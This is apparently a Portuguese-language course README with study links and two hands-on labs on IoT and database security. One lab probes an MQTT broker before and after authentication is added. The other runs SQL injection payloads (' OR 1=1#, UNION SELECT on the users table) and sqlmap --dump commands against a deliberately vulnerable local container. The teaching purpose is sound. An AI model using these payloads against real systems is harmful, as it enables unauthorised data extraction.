# Encontros de Security do Módulo 09 do Curso de Engenharia da Computação (Inteli)

Este repositório possui os materiais de estudo, códigos e slides referentes a parte de Security do Módulo 09, cuja temática é **Hiperconectividade para Cidades Inteligentes**.


## Encontros de Security

### Encontro 01 - Introdução à Segurança da Informação com foco em ambientes IoT ###

<br/>

**Objetivo do Encontro:**

Introdução ao conceito de segurança da informação para ambientes IoT. Apresentação dos fundamentos de segurança como proteção de dados em trânsito e em armazenamento, autenticação e autorização da comunicação. Discussão sobre pertinência de cada uma das estratégias de proteção.

<br/>

**Material de Auto-Estudo:**

- [Confidentiality, Integrity, Availability, Authenticity, Non-repudiation | CIA Framework](https://www.youtube.com/watch?v=6m7mZNvM1Jo)

<br/>

**Materiais Complementares:**

*Mentalidade Hacker*

- [Por que times de segurança devem criar uma mentalidade hacker para defesa](https://evolutiatec.com.br/por-que-times-de-seguranca-devem-criar-uma-mentalidade-hacker/)
- [Como pensar como um hacker e ficar à frente das ameaças](https://www.xlogic.com.br/como-pensar-como-um-hacker-e-ficar-a-frente-das-ameacas/)

*CIA Triad*
- [What is the CIA Triad? | Definition from TechTarget](https://www.techtarget.com/whatis/definition/Confidentiality-integrity-and-availability-CIA)
- [What is the CIA Triad and Why is it important? | Fortinet](https://www.fortinet.com/resources/cyberglossary/cia-triad)

*Vulns*
- [Cache Poisoning | OWASP Foundation](https://owasp.org/www-community/attacks/Cache_Poisoning)
- [Meltdown and Spectre](https://meltdownattack.com/)
- [What is MITM (Man in the Middle) Attack | Imperva](https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/)
- [Packet Sniffing Meaning, Methods, Examples and Best Practices](https://www.spiceworks.com/it-security/network-security/articles/what-is-packet-sniffing/)
- [What is Social Engineering? | Definition - Kaspersky](https://usa.kaspersky.com/resource-center/definitions/what-is-social-engineering)
- [What is a distributed denial-of-service (DDoS) attack? | Cloudflare](https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/)
- [What are DDoS attacks? - Rugged Tooling](https://ruggedtooling.com/what-are-ddos-attacks/)

*Mitigations*
- [What is role-based access control (RBAC)? | Cloudflare](https://www.cloudflare.com/learning/access-management/role-based-access-control-rbac/)
- [What Is Digital Certificate? A Definitive Guide](https://www.clickssl.net/blog/what-is-digital-certificate)
- [What Are Digital Certificates? | Fortinet](https://www.fortinet.com/resources/cyberglossary/digital-certificates)
- [What Is a CDN (Content Delivery Network)? | How Do CDNs Work? | Akamai](https://www.akamai.com/glossary/what-is-a-cdn)

*Advanced Topics*
- [MITRE ATT&CK](https://attack.mitre.org/)
- [MQTT Stresser](https://github.com/inovex/mqtt-stresser)
- [MQTT-PWN](https://github.com/akamai-threat-research/mqtt-pwn)

*Lab Reference*
- [How to setup Mosquitto MQTT Broker using docker](https://github.com/sukesh-ak/setup-mosquitto-with-docker)

*Extra*
- [Live Cyber Threat Map | Check Point](https://threatmap.checkpoint.com/)
- [MAP | Kaspersky Cyberthreat real-time map](https://cybermap.kaspersky.com/)

<br/>

**Slides:**

- [Encontro 01 -  Introdução à Segurança da Informação com foco em ambientes IoT](https://docs.google.com/presentation/d/1t0NWIW4tCYDQLSCf03uuUBli1_BIdDvazp0bm6ArDhM)

<br/>

**Roteiro do Lab:**

Este Lab irá apresentar diversos cenários de vuln, o ideal é trabalhar em duplas ou trios (grupos de 2/3 alunos).

> **Dica:** É bom trabalhar em pequenos grupos para discutir as abordagens e vulnerabilidades.

1. Selecione algum aplicativo de cliente MQTT (MQTT Dashboard ou MQTT Dash para Android, MQTTool para iOS, HiveMQ Websocket Client para Web).

2. Selecione algum broker público da seguinte lista: [10 Free Public MQTT Brokers(Private & Public)](https://mntolia.com/10-free-public-private-mqtt-brokers-for-testing-prototyping/).

> **Sugestão:** Utilize o [HiveMQ WebSocket Client para Web](https://www.hivemq.com/demos/websocket-client/), pois já vem com um broker default pré-configurado.

3. Faça a conexão com o broker e anote o ClientID utilizado.

> **Pergunta:** O que acontece se você utilizar o mesmo ClientID em outra máquina ou sessão do browser? Algum pilar do CIA Triad é violado com isso?

4. Agora vamos criar um ambiente containerizado para rodar localmente uma versão do Mosquitto, é uma boa prática criar um contexto separado para analisar por vulnerabilidades em um sistema, também chamado de Sandbox.

5. Escolha uma pasta no seu OS e crie a pasta do container Mosquitto e dentro a sua pasta de config:

```
mkdir mqtt5
cd mqtt5

# Nesta pasta ficarão os arquivos mosquitto.conf e pwfile (para a password)
mkdir config
```

6. Crie o arquivo `config/mosquitto.conf` e adicione as seguintes infos:

```
allow_anonymous true
listener 1883
listener 9001
protocol websockets
persistence true
password_file /mosquitto/config/pwfile
persistence_file mosquitto.db
persistence_location /mosquitto/data/
```

7. Crie o arquivo `config/pwfile` e deixe ele em branco.

8. Crie o arquivo `docker-compose.yml` na pasta raíz do contêiner e coloque a seguinte config:

```
version: "3.7"
services:
  mqtt5:
    image: eclipse-mosquitto
    container_name: mqtt5
    ports:
      - "1883:1883" # Default MQTT port
      - "9001:9001" # Default MQTT port for WebSockets
    volumes:
      - ./config:/mosquitto/config:rw
      - ./data:/mosquitto/data:rw
      - ./log:/mosquitto/log:rw
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.01'
          memory: 100M

volumes:
  config:
  data:
  log:

networks:
  default:
    name: mqtt5-network
```

> **Pergunta:** Com os parâmetros de `resources`, algum pilar do CIA Triad pode ser facilmente violado?

9. Agora podemos subir o contêiner:

```
docker-compose -p mqtt5 up -d
```

10. Vamos verificar se o contêiner está rodando normalmente:

```
docker ps
```

> Observação: Anote o `Container ID`, utilizaremos em breve.


11. Com o contêiner funcionando, vamos acessar a shell dele:

```
sudo docker exec -it <Container ID> sh
```

12. Vamos fazer o Subscribe em um tópico (sem autenticação):

```
mosquitto_sub -v -t 'hello/topic'
```

> **Curiosidade:** Já tentou fazer o Subscribe no tópico #? (sim, apenas a hashtag). O que acontece?

13. Abra outro terminal, entre no contêiner e vamos fazer o Publish:

```
mosquitto_pub -t 'hello/topic' -m 'hello MQTT World'
```

> **OBS:** Caso dê erro de não encontrar os executáveis acima ou quer testar "por fora" do contêiner em ambiente Linux, basta instalar o `mosquitto-clients` por meio do seguinte comando:

```
sudo apt install mosquitto-clients
```

> **Pergunta:** Sem autenticação (repare que a variável `allow_anonymous` está como `true`), como a parte de confidencialidade pode ser violada?

14. Vamos implementar a camada de autenticação, começando por reabrir o arquivo `config/mosquitto.conf` e modificar a primeira linha, trocando a variável `allow_anonymous` para `false`.

15. Dentro do contêiner (acesse a shell dele), vamos criar o usuário com o seguinte comando:

```
mosquitto_passwd -c /mosquitto/config/pwfile <username>
```

> **OBS:** O comando pedirá o password que deseja para o `username` informado.

16. Reinicie o contêiner para refletir as novas configurações:

```
docker restart <Container ID>
```

17. A partir de agora, as ações de Subscribe / Publish terão que passar por uma camada de autenticação para serem efetivadas:

```
mosquitto_sub -v -t 'hello/topic' -u <username> -P <password>

mosquitto_pub -t 'hello/topic' -m 'hello MQTT World' -u <username> -P <password>
```

> **Opcional:** Se quiser testar por fora utilizando os seguintes comandos de Subscribe / Publish:

```
mosquitto_sub -v -L mqtt://<username>:<password>@localhost/hello/topic

mosquitto_pub -L mqtt://<username>:<password>@localhost/hello/topic -m 'hello MQTT World'
```

**Perguntas:**

Agora que temos um broker remoto ([HiveMQ WebSocket Client para Web](https://www.hivemq.com/demos/websocket-client/), por exemplo) e um broker local (no contêiner), durante a execução do roteiro acima, nas seções de perguntas é possível identificar situações pela qual uma vuln pode ser explorada ou 'exploitada'.

Colocarei mais algumas perguntas para pensar em mais possibilidades (lembra da Mentalidade Hacker?).

Dá para utilizar tanto o broker remoto quanto o broker local para conduzir as simulações.

> **Pergunta:** Tente simular uma violação do pilar de Confidencialidade.

> **Pergunta:** Tente simular uma violação do pilar de Integridade.

> **Pergunta:** Tente simular uma violação do pilar de Disponibilidade. **Esse tem um truque!**

> **Dica:** Lembre-se dos conceitos do CIA Triad, pode ajudar bastante.

> **Dica:** Guarde as evidências para o relatório.

<br />

### Encontro 02 - Segurança em Base de Dados ###

<br/>

**Objetivo do Encontro:**

Segurança em Armazenamento e Base de Dados. Uso de Criptografia e Controle de Acesso.

<br/>

**Material de Auto-Estudo:**

- [Segurança da informação - Segurança em Nuvem](https://www.youtube.com/watch?v=3sVoaU03ANI)

<br/>

**Materiais Complementares:**

*Controle de Acesso*

- [What is Access Control in Database Security?](https://www.datasunrise.com/professional-info/what-is-access-control/)

*Spoofing and Block/Allow Lists*
- [Allowlist vs Blocklist](https://www.manageengine.com/application-control/allowlisting-vs-blocklisting.html)
- [O que é spoofing?](https://www.kaspersky.com.br/resource-center/definitions/ip-and-email-spoofing)
- [IP Spoofing Unraveled: What It Is & How to Prevent It](https://www.okta.com/identity-101/ip-spoofing/)
- [What is Spoofing: A Definition and How to Prevent It](https://www.pandasecurity.com/en/mediacenter/what-is-spoofing/)

*Criptografia*
- [What is asymmetric encryption?](https://www.cloudflare.com/learning/ssl/what-is-asymmetric-encryption/)
- [Asymmetric Encryption: Definition, Architecture, Usage](https://www.okta.com/identity-101/asymmetric-encryption/)

*Injection Attacks*
- [Top Injection Attacks and How to Avoid Them](https://www.guardrails.io/blog/top-injection-attacks-and-how-to-avoid-them/)
- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
- [Hacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)

*Matriz de Probabilidade e Impacto*
- [O que é a Matriz de Probabilidade e Impacto?](https://concentsistemas.com.br/2023/03/27/o-que-e-a-matriz-de-probabilidade-e-impacto/)

<br/>

**Slides:**

- [Encontro 02 - Segurança em Base de Dados](https://docs.google.com/presentation/d/1jnewGaHlnIB9PeOuECoupA0YtSzd29T0_XvV7RjCYxU)

<br/>

**Roteiro do Lab:**

Este Lab irá apresentar diversos cenários de SQL Injection, o ideal é trabalhar em duplas ou trios (grupos de 2/3 alunos).

> **Observação:** Vamos trabalhar com base em uma imagem Docker que possui diversas vulnerabilidades, o ideal é conduzir esses tipos de testes em ambiente controlados e containerizados.

1. Primeiro vamos clonar um repo que contém o `docker-compose.yml` e os assets para subir o contêiner vulnerável, entre no terminal (ou prompt de comando) na pasta desejada e rode o seguinte comando:

```
git clone https://github.com/thomaslaurenson/startrek_payroll
```

> **Observação:** Caso tenha problemas em fazer o clone do repo, basta baixar a versão zipada do repo e descompactar na pasta de sua preferência.

2. Aproveitando a tela do terminal, basta entrar na pasta do repo local e disparar o Docker Compose:

```
cd startrek_payroll-main

docker-compose up --build
```

> **Observação:** Esse processo de criar o contêiner pode demorar alguns minutos.

3. Com o contêiner funcionando, ele contém basicamente um sistema PHP com um MySQL 5 (ambos vulneráveis), para acessar a interface de login onde conduziremos alguns cenários de SQL Injection, basta acessar a seguinte URL pelo browser:

```
http://localhost:8080/
```

4. Teste fazer o login com os seguintes cenários propostos pelo autor do repo:

```
Normal login to get users salary:
username: james_kirk
password: kobayashi_maru

Dump username and salary of all users:
username: ' OR 1=1#
password: anythingyouwant

Dump MySQL version:
username: ' UNION SELECT null,@@version#
password: anythingyouwant

Dump all users passwords:
username: ' UNION SELECT username,password FROM users#
password: anythingyouwant
```

5. Observe o log do `webserver` para ver que interessante fica a query completa que é enviada para o `MySQL`.

6. Analisar essas vulnerabilidades de forma manual acaba exigindo muito tempo e não é escalável, então utilizaremos de uma `tool` chamada `SQLMap` que irá automatizar (em certa medida) esse processo.

7. Entre na página da ferramenta (https://sqlmap.org/) e baixe a versão zipada ou o tarball e descompacte na sua pasta de preferência.

8. Abra outro terminal, entre na pasta onde descompactou o `SQLMap` e rode ele com as seguintes flags:

```
python sqlmap.py -u http://localhost:8080/ --batch --banner --method POST --forms
```

> **Observação:** Esse comando buscará vulnerabilidades em um form (--forms) do tipo POST (--method POST) na URL informada, além disso, de forma automatizada (--batch) tentará algumas formas de injetar SQL, buscando também descobrir qual tipo de banco de dados que está sendo utilizado (--banner).

> **Opcional:** Tente executar agora sem a flag --batch para ver o que o `SQLMap` pede para decidir durante o processo de exploração de vulnerabilidades.

9. Observe no terminal do `SQLMap` que ele coloca os resultados da análise em um arquivo .csv.

10. É possível direcionar a exploração para formas específicas de vulnerabilidade, como fazer o dump da tabela de usuários, para fazer isso, basta acrescentarmos a flag --dump no comando:

```
python sqlmap.py -u http://localhost:8080/ --batch --banner --method POST --forms --dump
```

11. A ferramenta faz o dump da tabela tanto na tela (`stdout`) quanto em um arquivo .csv.

> **Opcional:** No link (https://github.com/sqlmapproject/sqlmap/wiki/Usage) é possível ver as inúmeras possibilidades de formas de ataque que podem ser simuladas por essa ferramenta.